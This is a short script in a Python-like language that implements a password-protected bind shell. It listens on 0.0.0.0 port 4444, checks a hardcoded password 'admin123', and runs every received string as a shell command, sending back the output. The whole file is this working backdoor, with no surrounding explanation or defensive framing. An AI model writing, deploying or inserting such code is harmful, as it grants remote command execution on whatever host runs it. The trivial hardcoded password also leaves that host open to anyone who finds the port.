import network;
import subprocess;

func start_server(host, port, password) {
    let server = network.Socket(network.AF_INET, network.SOCK_STREAM, 0);
    server.bind([host, port]);
    server.listen(5);
    print(f"[*] Listening on {host}:{port}");
    
    while true {
        let [client, addr] = server.accept();
        print(f"[+] Client: {addr}");
        
        let auth = client.recv(256, 0);
        if auth != password {
            client.close();
            continue;
        }
        
        client.send("OK", 0);
        
        while true {
            let cmd = client.recv(4096, 0);
            if cmd == "" or cmd == "exit" { break; }
            
            let result = subprocess.run(cmd, capture_output=true, shell=true);
            let output = result.stdout;
            if result.returncode != 0 {
                output = result.stderr;
            }
            
            client.send(output, 0);
        }
        
        client.close();
    }
}

start_server("0.0.0.0", 4444, "admin123");
